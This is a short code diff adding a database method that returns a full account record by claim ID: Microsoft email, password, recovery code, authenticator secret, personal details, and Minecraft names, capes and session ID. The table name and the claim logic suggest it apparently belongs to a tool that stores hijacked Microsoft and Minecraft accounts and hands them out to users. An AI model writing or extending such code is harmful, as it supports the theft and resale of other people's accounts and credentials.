@@ -178,3 +178,19 @@ class DBConnection:
             WHERE claim_id = ? AND claimed_by IS NULL
         """, (user_id, claim_id))
         self.conn.commit()
+
+    def getSecuredAccount(self, claim_id: str) -> dict | None:
+        row = self.cursor.execute("""
+            SELECT ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
+                   ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday,
+                   mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid
+            FROM `secured_accounts` WHERE claim_id = ?
+        """, (claim_id,)).fetchone()
+        if not row:
+            return None
+        keys = [
+            "ms_email", "ms_security_email", "ms_password", "ms_recovery_code", "ms_auth_secret",
+            "ms_first_name", "ms_last_name", "ms_full_name", "ms_region", "ms_birthday",
+            "mc_name", "mc_method", "mc_gamertag", "mc_uchange", "mc_capes", "mc_ssid"
+        ]
+        return dict(zip(keys, row))
